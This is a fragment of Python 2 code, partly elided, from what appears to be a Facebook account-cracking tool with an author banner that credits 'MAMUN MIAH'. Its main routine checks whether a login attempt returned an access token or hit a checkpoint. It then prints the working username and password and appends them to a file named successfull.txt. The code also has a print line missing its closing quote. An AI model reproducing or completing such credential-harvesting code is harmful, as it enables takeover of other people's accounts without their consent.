...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : MAMUN MIAH'
    print '\x1b[1;91mFACEBOOK  : MAMUN MIAH'
    print '\x1b[1;91mGITHUB  : github.com/bdcyberpredators'
    print '\x1b[1;91mWHATSAPP  : +8801892325846
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[MAMUN-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[MAMUN-OK]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login JUST NOW]\x1b[0m \n'
